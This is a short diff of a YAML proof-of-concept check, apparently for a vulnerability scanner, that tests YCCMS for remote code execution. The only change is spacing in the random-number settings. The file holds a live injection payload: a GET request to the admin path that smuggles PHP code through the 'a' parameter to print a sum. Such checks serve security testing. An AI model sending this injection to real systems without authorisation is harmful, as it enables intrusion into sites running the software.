@@ -1,7 +1,7 @@
 name: poc-yaml-yccms-rce
 set:
-  r: randomInt(800000000,1000000000)
-  r1: randomInt(800000000,1000000000)
+  r: randomInt(800000000, 1000000000)
+  r1: randomInt(800000000, 1000000000)
 rules:
   - method: GET
     path: "/admin/?a=Factory();print({{r}}%2b{{r1}});//../"
